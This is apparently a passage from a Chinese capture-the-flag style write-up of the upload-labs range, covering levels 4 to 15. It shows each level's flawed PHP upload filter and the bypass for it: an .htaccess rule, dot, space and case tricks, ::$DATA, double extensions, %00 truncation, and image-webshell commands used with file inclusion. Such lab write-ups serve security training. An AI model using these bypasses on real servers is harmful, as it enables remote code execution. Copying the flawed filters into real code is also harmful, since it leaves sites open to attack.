<span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>针对Apache，有一个.htaccess的配置文件，</p><blockquote><p>.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p></blockquote><p>前提是在配置文件httpd.conf中有如下配置代码 不是AllowOverride None ，而是 AllowOverride  All</p><p>可以先上传.htaccess文件，在文件指定某个文件以php格式运行，在上传木马图片，点击上传好的链接进行运行。</p><h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h3><ul><li>配置.htaccess文件，并上传</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;FilesMatch "test4.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>匹配到test4.jpg的文件，就以php格式运行</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233001.png"></p><ul><li>制作图片密码（Linux）</li></ul><p>其中test3.php为木马代码</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233002.png"></p><ul><li>上传图片test4.jpg，并访问</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233003.png"></p><h2 id="Pass-05（点绕过）"><a href="#Pass-05（点绕过）" class="headerlink" title="Pass-05（点绕过）"></a>Pass-05（点绕过）</h2><h3 id="验证方式-4"><a href="#验证方式-4" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端：黑名单，点绕过：</strong>其实于04关代码相同</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p><strong>点绕过：</strong>由于后端去除后缀名的点只有一次，所以构造“.  .”，点空格点的形式，由于Windows的特性，在文件后缀名过后追加一个点，或者一个空格，还是原文件本身。</p><p>比如绕过黑名单验证过后得到的文件后缀为.php.  ，由于Windows的特性最后在服务器的文件为.php</p><h3 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h3><ul><li>上传php，抓包更改文件后缀</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233004.png"></p><ul><li>访问上传成功的链接</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233005.png"></p><h2 id="Pass-06（大小写转换）"><a href="#Pass-06（大小写转换）" class="headerlink" title="Pass-06（大小写转换）"></a>Pass-06（大小写转换）</h2><h3 id="验证方式-5"><a href="#验证方式-5" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端：黑名单（大小写转换）：</strong>后端给出了黑名单，但是代码中没有强制转换成小写</p><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>把上传的php文件用大小写混写上传。</p><h3 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h3><ul><li>抓包更改后缀</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233006.png"></p><ul><li>访问上传的链接</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233007.png"></p><h2 id="Pass-07（空格绕过）"><a href="#Pass-07（空格绕过）" class="headerlink" title="Pass-07（空格绕过）"></a>Pass-07（空格绕过）</h2><h3 id="验证方式-6"><a href="#验证方式-6" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，黑名单（空格绕过）：</strong>在这里，验证代码中没有最后一步的去掉后面的空格，</p><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>在黑名单中没有对”.php “，进行过滤。我们可以构造”.php .“来使得最后代码验证过后得到的文件后缀为，“.php ”（含空格）</p><p>由于Windows的特性，在文件后缀加上空格，最终得到的文件还是源文件，最终在服务器上的为.php执行文件。</p><h3 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h3><ul><li>抓包构造</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233008.png"></p><ul><li>访问上传好的链接</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233009.png"></p><h2 id="Pass-08（点绕过）"><a href="#Pass-08（点绕过）" class="headerlink" title="Pass-08（点绕过）"></a>Pass-08（点绕过）</h2><h3 id="验证方式-7"><a href="#验证方式-7" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，黑名单（点绕过）：</strong>缺少去除后缀后的点</p><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>与第五关原理相同</p><h3 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h3><ul><li>抓包更改</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233010.png"></p><ul><li>访问链接</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233011.png"></p><h2 id="Pass-09（-DATA）"><a href="#Pass-09（-DATA）" class="headerlink" title="Pass-09（::$DATA）"></a>Pass-09（::$DATA）</h2><h3 id="验证方式-8"><a href="#验证方式-8" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端：黑名单，::$DATA：</strong>此次的验证代码中缺失</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>在window的时候如果文件名+<code>"::$DATA"</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p><p>在文件中添加后缀就行了</p><h3 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h3><ul><li>抓包添加::$DATA</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233012.png"></p><ul><li>访问图片链接</li></ul><p>注意url里面要删去图片链接的::$DATA</p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233013.png" style="zoom:67%;"><h2 id="Pass-10（点绕过）-x3D-x3D-Pass-05"><a href="#Pass-10（点绕过）-x3D-x3D-Pass-05" class="headerlink" title="Pass-10（点绕过）==Pass-05"></a>Pass-10（点绕过）==Pass-05</h2><h3 id="验证方式-9"><a href="#验证方式-9" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，黑名单：</strong>验证代码只验证一次</p><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>因为后端的代码只验证了一次，所以是用双点，来进行绕过</p><h3 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h3><p>见Pass-05</p><h2 id="Pass-11（双后缀名绕过）"><a href="#Pass-11（双后缀名绕过）" class="headerlink" title="Pass-11（双后缀名绕过）"></a>Pass-11（双后缀名绕过）</h2><h3 id="验证方式-10"><a href="#验证方式-10" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，黑名单：</strong>一次性的验证，把上传的文件与黑名单相同的替换为空</p><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>因为是一次性的验证，且把上传文件中与黑名单相同的文件替换为空，那么可以构造后缀使得替换空过后得到的后缀就是php脚本的。</p><h3 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h3><ul><li>抓包更改数据包</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233014.png"></p><ul><li>访问上传的链接</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233015.png" alt="23"></p><h2 id="Pass-12（-00，0x00，-x2F-00截断）"><a href="#Pass-12（-00，0x00，-x2F-00截断）" class="headerlink" title="Pass-12（%00，0x00，/00截断）"></a>Pass-12（%00，0x00，/00截断）</h2><h3 id="验证方式-11"><a href="#验证方式-11" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，白名单：</strong>只有允许上传指定的文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//抓取上传文件的后缀名</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><blockquote><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。</p><p>操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。</p><p>因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制</p></blockquote><p><span style="background:#00BFFF">#d 截断的分类</span></p><ul><li>%00：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1001.2101.3001.7020">字符串</a>结束，所以当url中出现%00时就会认为读取已结束</li><li>0x00：0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制。需要注意的是，0x00截断是16进制的截断，需要修改16进制的数据头，如果使用burp，就要在Hex中对数据进行改写。</li></ul><p><span style="background:#00BFFF">#d 00截断条件</span></p><ol><li>PHP版本小于5.3.4</li><li>php.ini中的magic_quotes_gpc设置为Off</li><li>上传路劲可控：据包中须含有上传后文件的目录情况才可以用，比如数据包中存在<code>path: uploads/</code>，那么攻击者可以通过修改path的值来构造paylod: <code>uploads/aa.php%00</code></li></ol><h3 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h3><p>本次实验需要的PHP版本小于5.3.4，而本次实验的php版本高于5.3.4</p><ul><li>代码是用GET的方式提交的，所以在进行%00截断的时候，%00是写在路径当中的。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233016.png"></p><h2 id="Pass-13-同12"><a href="#Pass-13-同12" class="headerlink" title="Pass-13(同12)"></a>Pass-13(同12)</h2><h3 id="验证方式-12"><a href="#验证方式-12" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，白名单：</strong>只有允许上传指定的文件</p><h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><p>13 关与12关有一些差别，12关是的上路劲是GET的方式，是在URL中的，浏览器会自动对其进行解码。</p><p>此关卡是用的POST提交的方式，浏览器不会对器进行解码，需要自动编码一下</p><h3 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h3><ul><li>抓包对参数进行修改</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233017.png"></p><ul><li>最终的修改方式</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233018.png"></p><h2 id="Pass-14（文件包含）"><a href="#Pass-14（文件包含）" class="headerlink" title="Pass-14（文件包含）"></a>Pass-14（文件包含）</h2><h3 id="验证方式-13"><a href="#验证方式-13" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，白名单：</strong>但是可以利用文件包含</p><h3 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h3><p>#d 文件包含</p><blockquote><p>开发人员将需要重复调用的函数写入一个文件，对该文件进行包含时产生的操作。文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。</p></blockquote><p>如果设置了fiel变量，则把file的文件包含进去，这个关卡的文件包含</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233019.png"></p><p>通过设置图片马，把如片上传到网站，然后利用文件包含执行木马</p><h3 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h3><ul><li>制作图片码</li></ul><p>Linux</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cat init.jpg test14.php &gt;&gt;webshell.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windows</p><pre class="line-numbers language-test" data-language="test"><code class="language-test">copy init.jpg /b + test14.php /a webshell.jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>上传并获得文件路径</p></li><li><p>设置文件包含</p><p><strong>这里要特别注意文件包含的目录，是在include.php中的file进行设置。如果到别的地方去进行包含的话是不能执行脚本的。</strong></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233020.png"></p><h2 id="Pass-15（文件包含）"><a href="#Pass-15（文件包含）" class="headerlink" title="Pass-15（文件包含）"></a>Pass-15（文件包含）</h2><h3 id="验证方式-14"><a href="#验证方式-14" class="headerlink" title="验证方式"></a>验证方式</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取图像的信息</span>      <span class="token comment">/*  getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。函数成功返回的就是一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。返回的值是一个七位的数组索引 0 给出的是图像宽度的像素值索引 1 给出的是图像高度的像素值索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签索引 bits 给出的是图像的每种颜色的位数，二进制格式索引 channels 给出的是图像的通道值，RGB 图像默认是 3索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header("Content-type: image/jpeg");*/</span>        <span class="token 